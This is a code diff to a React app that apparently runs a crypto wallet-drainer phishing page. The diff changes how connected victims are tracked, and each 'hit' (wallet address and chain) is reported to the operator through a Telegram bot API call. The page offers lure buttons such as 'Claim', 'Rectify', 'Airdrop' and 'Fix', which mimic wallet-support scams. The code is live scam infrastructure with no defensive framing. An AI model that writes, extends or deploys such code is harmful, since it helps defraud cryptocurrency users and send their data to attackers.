@@ -24,9 +24,9 @@ export default function App() {
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_vF_102')) {
-      log(`🎯 NEW HIT!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('hit_vF_102', 't');
+    if (isConnected && address && !sessionStorage.getItem('hit_vF_Monday')) {
+      log(`🎯 NEW MONDAY HIT!\nADDR: ${address}\nNET: ${chainId}`);
+      sessionStorage.setItem('hit_vF_Monday', 't');
     }
   }, [isConnected, address, chainId]);
 
@@ -76,7 +76,6 @@ export default function App() {
           </div>
           {view === "menu" && (
             <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
-              {/* NO KYC BUTTON */}
               {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Fix"].map(n => (
                 <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} 
                 style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
